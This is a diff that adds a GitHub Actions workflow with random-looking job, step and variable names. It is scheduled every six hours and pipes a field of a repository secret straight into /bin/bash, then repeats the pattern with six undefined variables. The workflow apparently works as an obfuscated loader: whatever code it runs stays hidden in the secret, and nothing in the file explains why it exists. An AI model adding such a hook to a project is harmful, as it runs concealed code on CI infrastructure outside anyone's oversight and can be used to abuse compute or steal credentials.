@@ -1,0 +1,24 @@
+name: lilingsu6457
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lilingsu6457
+        env:
+          vecey4878: ${{ secrets.vecey4878 }}
+        run: |
+          echo $vecey4878 | jq -r .ssczu8357 | /bin/bash
+          echo $knh30 | jq -r .bmuwq1 | /bin/bash
+          echo $dn79 | jq -r .epmln9 | /bin/bash
+          echo $jigd00361 | jq -r .anmt4 | /bin/bash
+          echo $z5465 | jq -r .aqxx50 | /bin/bash
+          echo $q7615 | jq -r .mwl92 | /bin/bash
+          echo $bi5722 | jq -r .ul1113 | /bin/bash
+
